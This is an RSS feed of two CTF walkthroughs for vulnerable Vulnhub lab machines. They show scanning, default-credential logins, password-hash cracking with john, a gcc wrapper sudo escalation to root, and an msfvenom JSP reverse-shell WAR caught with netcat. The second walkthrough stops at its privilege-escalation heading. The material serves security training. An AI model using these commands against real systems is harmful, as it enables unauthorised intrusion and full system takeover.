@@ -1,0 +1,1149 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>vulnhub Archives - Armour Infosec</title>
+	<atom:link href="https://www.armourinfosec.com/tag/vulnhub/feed/" rel="self" type="application/rss+xml" />
+	<link>https://www.armourinfosec.com/tag/vulnhub/</link>
+	<description>Do Your Part - Be Security Smart</description>
+	<lastBuildDate>Fri, 10 Apr 2020 19:40:49 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.3.1</generator>
+
+<image>
+	<url>https://www.armourinfosec.com/wp-content/uploads/2018/02/ai.png</url>
+	<title>vulnhub Archives - Armour Infosec</title>
+	<link>https://www.armourinfosec.com/tag/vulnhub/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>InfoSecWarrior CTF: 3 Walkthrough</title>
+		<link>https://www.armourinfosec.com/infosecwarrior-ctf-3-walkthrough/</link>
+					<comments>https://www.armourinfosec.com/infosecwarrior-ctf-3-walkthrough/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Thu, 09 Apr 2020 18:25:45 +0000</pubDate>
+				<category><![CDATA[Walkthrough]]></category>
+		<category><![CDATA[armour infosec]]></category>
+		<category><![CDATA[ctf]]></category>
+		<category><![CDATA[infosec warrior]]></category>
+		<category><![CDATA[infosec warrior 3]]></category>
+		<category><![CDATA[vulnhub]]></category>
+		<category><![CDATA[walkthrough]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=26013</guid>
+
+					<description><![CDATA[<p>Here is the new challenge of InfoSecWarrior CTF: 3 Walkthrough by Infosec Warrior CTF 2020. The box is designed by...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/infosecwarrior-ctf-3-walkthrough/">InfoSecWarrior CTF: 3 Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>Here is the new challenge of <a href="https://www.infosecwarrior.com/infosecwarrior-ctf-2020-3/"><strong>InfoSecWarrior CTF: 3 Walkthrough</strong></a> by <a href="https://www.infosecwarrior.com/">Infosec Warrior CTF 2020</a>. The box is designed by Vishal Biswas aka CyberKnight. The goal is to gain the highest privileges and collect only 2 flags (user flag and root flag). According to author box consist  WordPress developer configured the machine to work internally. But due to some miss-configuration WordPress is exposed to the outside world. Use your skills and get the root flag. So let us go.</p>
+<p>&nbsp;</p>
+<p><img decoding="async" fetchpriority="high" class="alignnone wp-image-26026 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-10-09-07-53.png" alt="" width="800" height="522" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-10-09-07-53.png 800w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-10-09-07-53-300x196.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-10-09-07-53-768x501.png 768w" sizes="(max-width: 800px) 100vw, 800px" /></p>
+<h3>Pentester Methodology</h3>
+<h5>Network Scanning</h5>
+<ul>
+<li>Netdiscover</li>
+<li>Nmap</li>
+</ul>
+<h5>Enumeration</h5>
+<ul>
+<li>Nikto</li>
+<li>phpMyAdmin</li>
+<li>John</li>
+<li>SSH</li>
+</ul>
+<h5>Privilege Escalation</h5>
+<ul>
+<li>Sudo -l</li>
+<li>gcc compilation</li>
+</ul>
+<h3>Network Scanning</h3>
+<p>We start with <strong>Netdiscover </strong> to obtain IP address as followed</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#netdiscover -i vboxnet0
+	 Currently scanning: 192.168.12.0/16   |   Screen View: Unique Hosts                                                                                                                            
+                                                                                                                                                                                                
+ 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 102                                                                                                                                
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.2.2     08:00:27:a0:51:d5      1      42  PCS Systemtechnik GmbH                                                                                                                       
+ 192.168.2.17    08:00:27:a7:26:e1      1      60  PCS Systemtechnik GmbH
+</pre>
+<p>Got the machine Ip <strong>192.168.2.17 </strong>and let us scan the <strong>Nmap.</strong></p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nmap -p- -A -O 192.168.2.17
+Starting Nmap 7.80 ( https://nmap.org/ ) at 2020-04-09 18:53 IST
+Nmap scan report for 192.168.2.17
+Host is up (0.00048s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d8:ad:48:16:27:f8:cc:99:3a:2f:db:c1:a9:d5:3a:d1 (RSA)
+|   256 51:06:ab:78:61:f5:4c:03:a0:8f:01:27:f9:17:51:e7 (ECDSA)
+|_  256 d5:63:58:ba:2a:d5:d2:17:cb:63:12:34:d6:cd:b6:b9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: WordPress 5.3.2
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: TEST WORDPRESS – Just another WordPress site
+MAC Address: 08:00:27:A7:26:E1 (Oracle VirtualBox virtual NIC)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=4/9%OT=22%CT=1%CU=44313%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
+OS:=5E8F21EA%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%
+OS:TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
+OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=
+OS:FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
+OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
+OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
+OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
+OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
+OS:%T=40%CD=S)</pre>
+<h3>Enumeration</h3>
+<p>On visiting the web page there, we see a WordPress web site. But the WordPress website doesn’t work properly error here so we moved on our next step.</p>
+<p><img decoding="async" class="alignnone wp-image-26015 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-082625.jpg" alt="" width="537" height="677" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-082625.jpg 537w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-082625-238x300.jpg 238w" sizes="(max-width: 537px) 100vw, 537px" /></p>
+<p>So I fired <strong>Nikto </strong>and found <strong>phpMyAdmin page.</strong></p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nikto -h http://192.168.2.17/
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.17
++ Target Hostname:    192.168.2.17
++ Target Port:        80
++ Start Time:         2020-04-09 18:55:13 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'link' found, with contents: &lt;http://127.0.0.1/index.php/wp-json/&gt;; rel="https://api.w.org/"
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site differently to the MIME type
++ Uncommon header 'x-redirect-by' found, with contents: WordPress
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ Uncommon header 'x-ob_mode' found, with contents: 1
++ Cookie goto created without the httponly flag
++ Cookie back created without the httponly flag
++ OSVDB-3092: /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ OSVDB-3092: /license.txt: License file found may identify site software.
++ /: A WordPress installation was found.
++ /phpmyadmin/: phpMyAdmin directory found
++ Cookie wordpress_test_cookie created without the httponly flag
++ /wp-login.php: WordPress login found
++ OSVDB-3092: /phpMyAdmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ 7916 requests: 0 error(s) and 20 item(s) reported on remote host
++ End Time:           2020-04-09 18:56:16 (GMT5.5) (63 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+<p>so I logged in with credentials <strong>root: root. </strong>it was a success</p>
+<p><img decoding="async" class="alignnone wp-image-26016 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083215.jpg" alt="InfoSecWarrior CTF: 3 Walkthrough" width="841" height="494" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083215.jpg 841w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083215-300x176.jpg 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083215-768x451.jpg 768w" sizes="(max-width: 841px) 100vw, 841px" /></p>
+<p>We successfully login with the root MySQL database then I select the wpdb database on open the wp-user table and we see two user entries Krishna and user1 as shown in the image file.</p>
+<p><img decoding="async" class="alignnone wp-image-26017 size-large" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083316-1024x460.jpg" alt="InfoSecWarrior CTF: 3 Walkthrough" width="1024" height="460" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083316-1024x460.jpg 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083316-300x135.jpg 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083316-768x345.jpg 768w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Annotation-2020-04-09-083316.jpg 1160w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p>I copy the users hash and save a text file and crack the hash using the john tool use the following command</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:04 0.13% (ETA: 20:05:08) 0g/s 5444p/s 5444c/s 5444C/s sharpie1..alvina
+0g 0:00:00:45 1.36% (ETA: 20:08:02) 0g/s 5109p/s 5109c/s 5109C/s 12062525..109109109
+infosec					(?)
+Session aborted
+
+john --wordlist=/usr/share/wordlists/rockyou.txt user
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:04 0.13% (ETA: 20:05:08) 0g/s 5444p/s 5444c/s 5444C/s sharpie1..alvina
+0g 0:00:00:45 23.36% (ETA: 20:08:02) 0g/s 5109p/s 5109c/s 5109C/s 12062525..109109109
+user1					(?)
+Session aborted</pre>
+<p>And we see WordPress hashes is cracked successfully and I try to login ssh using the WordPress credentials and us successful login with ssh Krishna shell. Krishna: infosec</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#ssh krishna@192.168.2.17
+The authenticity of host '192.168.2.17 (192.168.2.17)' can't be established.
+ECDSA key fingerprint is SHA256:L8AFuzt5MRe4jDRpDukvoY4rrvpBMl49RbM0tbVdeVM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.2.17' (ECDSA) to the list of known hosts.
+krishna@192.168.2.17's password: 
+krishna@ck05:~$ id 
+uid=1001(krishna) gid=1001(krishna) groups=1001(krishna)
+krishna@ck05:~$ hostname
+ck05
+krishna@ck05:~$ whoami 
+krishna</pre>
+<p>Got the Shell</p>
+<h3>Privilege Escalation</h3>
+<p>I ran the<strong> sudo -l</strong> command and I found <strong>Krishna</strong> has <strong>sudo</strong> permission to run a bash script as <strong>loopspell</strong> this script is compiler a <strong>#C</strong> language file using <strong>gcc</strong> using this command we privilege escalate this machine.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">krishna@ck05:~$ sudo -l
+Matching Defaults entries for krishna on ck05:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User krishna may run the following commands on ck05:
+    (loopspell : ALL) NOPASSWD: /home/loopspell/code_compiler.sh
+krishna@ck05:~$ sudo -u loopspell /home/loopspell/code_compiler.sh "-wrapper /bin/bash,-s ."
+Code is being compiling ...
+loopspell@ck05:~$ id 
+uid=1002(loopspell) gid=1002(loopspell) groups=1002(loopspell)
+loopspell@ck05:~$ hostname
+ck05
+loopspell@ck05:~$ whoami 
+loopspell</pre>
+<p>The sudo -l command and we see sudoers filer entry <strong>/usr/bin/gcc</strong> and <strong>code_compiler.sh</strong>. using sudo I again run the privilege escalation command and we have a root shell target machine</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">loopspell@ck05:/home$ cd loopspell/
+loopspell@ck05:/home/loopspell$ ls 
+backup.c  backup.txt  code_compiler.sh	user.txt
+loopspell@ck05:/home/loopspell$ cat user.txt 
+a4e3fea7510e570f6964899eb764abdc
+loopspell@ck05:/home/loopspell$ sudo -l
+Matching Defaults entries for loopspell on ck05:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User loopspell may run the following commands on ck05:
+    (ALL : ALL) /usr/bin/gcc
+    (ALL : ALL) NOPASSWD: /home/loopspell/code_compiler.sh
+loopspell@ck05:/home/loopspell$ sudo -l
+Matching Defaults entries for loopspell on ck05:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User loopspell may run the following commands on ck05:
+    (ALL : ALL) /usr/bin/gcc
+    (ALL : ALL) NOPASSWD: /home/loopspell/code_compiler.sh
+loopspell@ck05:/home/loopspell$ sudo /home/loopspell/code_compiler.sh 
+Code is being compiling ...
+gcc: fatal error: no input files
+compilation terminated.
+You can find your compiled code in /tmp/ directory.
+loopspell@ck05:/home/loopspell$ sudo /home/loopspell/code_compiler.sh "-wrapper /bin/bash,-s ."
+Code is being compiling ...
+root@ck05:/home/loopspell# id 
+uid=0(root) gid=0(root) groups=0(root)
+root@ck05:/home/loopspell# hostname
+ck05
+root@ck05:/home/loopspell# whoami
+root
+root@ck05:/home/loopspell# passwd
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+root@ck05:/home/loopspell# cd 
+root@ck05:~# ls
+msg.txt
+root@ck05:~# cd /root/
+root@ck05:/root# ls
+root.txt
+root@ck05:/root# cat root
+cat: root: No such file or directory
+root@ck05:/root# cat root.txt 
+_________        ___.                 ____  __.      .__       .__     __    _______   .________
+\_   ___ \___.__.\_ |__   ___________|    |/ _| ____ |__| ____ |  |___/  |_  \   _  \  |   ____/
+/    \  \&lt;   |  | | __ \_/ __ \_  __ \      &lt;  /    \|  |/ ___\|  |  \   __\ /  /_\  \ |____  \ 
+\     \___\___  | | \_\ \  ___/|  | \/    |  \|   |  \  / /_/  &gt;   Y  \  |   \  \_/   \/       \
+ \______  / ____| |___  /\___  &gt;__|  |____|__ \___|  /__\___  /|___|  /__|    \_____  /______  /
+        \/\/          \/     \/              \/    \/  /_____/      \/              \/       \/ 
+
+
+flag = efa4c284b8e2a15674dfb369384c8bcf
+
+This flag is a proof that you get the root shell.
+
+Tag me on Twitter with @CyberKnight00 
+root@ck05:/root# 
+</pre>
+<p>Eureka !!!! got root.</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/infosecwarrior-ctf-3-walkthrough/">InfoSecWarrior CTF: 3 Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/infosecwarrior-ctf-3-walkthrough/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>My Tomcat Host Vulnhub Walkthrough</title>
+		<link>https://www.armourinfosec.com/my-tomcat-host-walkthrough/</link>
+					<comments>https://www.armourinfosec.com/my-tomcat-host-walkthrough/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Thu, 09 Apr 2020 08:13:21 +0000</pubDate>
+				<category><![CDATA[Walkthrough]]></category>
+		<category><![CDATA[My Tomcat Host]]></category>
+		<category><![CDATA[vulnhub]]></category>
+		<category><![CDATA[walkthrough]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25994</guid>
+
+					<description><![CDATA[<p>Hello everyone. This time I am sharing the walkthrough of a CTF machine designed by Akanksha Verma. This is a...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/my-tomcat-host-walkthrough/">My Tomcat Host Vulnhub Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>Hello everyone. This time I am sharing the walkthrough of a CTF machine designed by <a href="https://twitter.com/akankshavermasv">Akanksha Verma</a>. This is a quick walkthrough of a vulnhub machine, My tomcat host. You can find this box on <a href="https://www.infosecwarrior.com/my-tomcat-host/">Infosec Warrior</a>. According to there author it is a medium or intermediate level machine with good privilege escalation. So here we go.</p>
+<h3 id="3194" class="ge gf aw ay gg b gh gi gj gk gl gm gn go gp gq gr dy"><strong class="gg hu"><img decoding="async" class="alignnone wp-image-25997 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-13-02-04-e1586436625155.png" alt="My Tomcat Host: 1 walkthrough" width="800" height="314" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-13-02-04-e1586436625155.png 800w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-13-02-04-e1586436625155-300x118.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-13-02-04-e1586436625155-768x301.png 768w" sizes="(max-width: 800px) 100vw, 800px" /></strong></h3>
+<h3 class="ge gf aw ay gg b gh gi gj gk gl gm gn go gp gq gr dy"><strong class="gg hu">Methodology applied :</strong></h3>
+<h5 id="5ea8" class="ge gf aw hy gg b gh gi gj gk gl gm gn go gp gq gr dy">Network Scanning</h5>
+<ul class="">
+<li id="2f58" class="ge gf aw ay gg b gh gi gj gk gl gm gn go gp gq gr hz ia ib" data-selectable-paragraph="">netdiscover</li>
+<li data-selectable-paragraph="">Nmap</li>
+</ul>
+<h5 id="de79" class="ge gf aw hy gg b gh gi gj gk gl gm gn go gp gq gr dy">Enumeration</h5>
+<ul class="">
+<li id="8560" class="ge gf aw ay gg b gh gi gj gk gl gm gn go gp gq gr hz ia ib" data-selectable-paragraph="">Nmap</li>
+<li id="9e71" class="ge gf aw ay gg b gh ic gj id gl ie gn if gp ig gr hz ia ib" data-selectable-paragraph="">nikto</li>
+<li id="c233" class="ge gf aw ay gg b gh gi gj gk gl gm gn go gp gq gr hz ia ib" data-selectable-paragraph="">msfvenom</li>
+</ul>
+<h5 id="634c" class="ge gf aw hy gg b gh gi gj gk gl gm gn go gp gq gr dy">Privilege escalation</h5>
+<ul class="">
+<li id="b7e7" class="ge gf aw ay gg b gh gi gj gk gl gm gn go gp gq gr hz ia ib" data-selectable-paragraph="">JAVA</li>
+<li data-selectable-paragraph="">sudo -l</li>
+</ul>
+<h3>Network Scanning</h3>
+<p>For scanning the network and obtaining the IP address of the box I used <strong>netdiscover. </strong> As shown below</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#netdiscover -i vboxnet0
+	Currently scanning: 192.168.18.0/16   |   Screen View: Unique Hosts                                                                                      
+	2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 102               
+	_____________________________________________________________________________
+	  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+	-----------------------------------------------------------------------------
+	192.168.2.2     08:00:27:a8:2f:81      1      42  PCS Systemtechnik GmbH      
+	192.168.2.15    08:00:27:f7:24:84      1      60  PCS Systemtechnik GmbH</pre>
+<p>So the IP of the box is <strong>192.168.2.15. </strong> let&#8217;s start with <strong>Nmap scanning</strong></p>
+<p>&nbsp;</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nmap -p- -A -O  192.168.2.15
+	Starting Nmap 7.80 ( https://nmap.org/ ) at 2020-04-09 09:52 IST
+	Nmap scan report for 192.168.2.15
+	Host is up (0.00044s latency).
+	Not shown: 65533 filtered ports
+	PORT     STATE SERVICE VERSION
+	22/tcp   open  ssh     OpenSSH 6.6.1 (protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 61:16:10:91:bd:d7:6c:06:df:a2:b9:b5:b9:3b:dd:b6 (RSA)
+	|   256 0e:a4:c9:fc:de:53:f6:1d:de:a9:de:e4:21:34:7d:1a (ECDSA)
+	|_  256 ec:27:1e:42:65:1c:4a:3b:93:1c:a1:75:be:00:22:0d (ED25519)
+	8080/tcp open  http    Apache Tomcat 9.0.31
+	|_http-favicon: Apache Tomcat
+	|_http-title: Apache Tomcat/9.0.31
+	MAC Address: 08:00:27:F7:24:84 (Oracle VirtualBox virtual NIC)
+	Device type: general purpose
+	Running: Linux 3.X|4.X
+	OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+	OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9
+	Network Distance: 1 hop
+	TRACEROUTE
+	HOP RTT     ADDRESS
+	1   0.44 ms 192.168.2.15
+</pre>
+<h3>Enumeration :</h3>
+<p>We can see that there is an open port number <strong>8080. </strong>So let us have a look there</p>
+<p id="618e" class="ge gf aw hy gg b gh gi gj gk gl gm gn go gp gq gr dy" data-selectable-paragraph=""><img decoding="async" class="alignnone wp-image-25996 size-large" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-53-20-1024x446.png" alt="" width="1024" height="446" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-53-20-1024x446.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-53-20-300x131.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-53-20-768x335.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-53-20.png 1065w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p>&nbsp;</p>
+<p>Good there a <strong>Tomcat Host </strong>on the box. For more information, I fired <strong>nikto</strong>.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nikto -h http://192.168.2.15:8080/
+	
+	- Nikto v2.1.6
+	---------------------------------------------------------------------------
+	+ Target IP:          192.168.2.15
+	+ Target Hostname:    192.168.2.15
+	+ Target Port:        8080
+	+ Start Time:         2020-04-09 09:54:21 (GMT5.5)
+	---------------------------------------------------------------------------
+	+ Server: No banner retrieved
+	+ The anti-clickjacking X-Frame-Options header is not present.
+	+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+	+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+	+ No CGI Directories found (use '-C all' to force check all possible dirs)
+	+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+	+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+	+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+	+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+	+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+	+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+	+ /axis2/axis2-web/HappyAxis.jsp: Apache Axis2 Happiness Page identified which includes internal application details.
+	+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 'tomcat'). Apache Tomcat.
+	+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+	+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+	+ /axis2/services/Version/getVersion: Apache Axis2 version identified.
+	+ /axis2/services/listServices: Apache Axis2 WebServices identified.
+	+ /axis2/axis2-web/index.jsp: Apache Axis2 Web Application identified.
+	+ /host-manager/status: Default Tomcat Server Status interface found
+	+ /manager/status: Tomcat Server Status interface found (pass protected)
+	+ 8041 requests: 0 error(s) and 18 item(s) reported on remote host
+	+ End Time:           2020-04-09 09:55:13 (GMT5.5) (52 seconds)
+	---------------------------------------------------------------------------
+	+ 1 host(s) tested</pre>
+<p>Out of all the things, the most important to us is that we have credentials for tomcat manager application, <strong class="gg hu">tomcat: tomcat. </strong>and the directory <strong class="gg hu">/manager/html </strong> page .</p>
+<p><img decoding="async" class="alignnone wp-image-25998 size-large" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-03-1024x432.png" alt="" width="1024" height="432" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-03-1024x432.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-03-300x126.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-03-768x324.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-03.png 1196w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p>We were in the host and found there is a <strong>.war file upload </strong>option. So without wasting time I use msfvenom to generate a shell.war file</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.2.1 LPORT=1505 -f war &gt; armour.war
+	
+	Payload size: 1106 bytes
+	The final size of war file: 1106 bytes</pre>
+<p>Where LHOST = listener host IP  &amp;&amp; LPORT = listener port</p>
+<p><img decoding="async" class="alignnone wp-image-25999 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-44.png" alt="" width="923" height="107" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-44.png 923w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-44-300x35.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-09-09-57-44-768x89.png 768w" sizes="(max-width: 923px) 100vw, 923px" /></p>
+<p>And we have our payload ready, and we are all set to launch the attack. Upload this shell.war file and call it on the browser while having the listener on, on our machine</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nc -nlvp 1505
+	
+	listening on [any] 1505 ...
+ 	connect to [192.168.2.1] from (UNKNOWN) [192.168.2.15] 57094
+	id
+	uid=998(tomcat) gid=997(tomcat) groups=997(tomcat)
+	hostname
+	my_tomcat
+	whoami
+	tomcat</pre>
+<p>Got the shell of the user tomcat</p>
+<h3>Privilege Escalation:</h3>
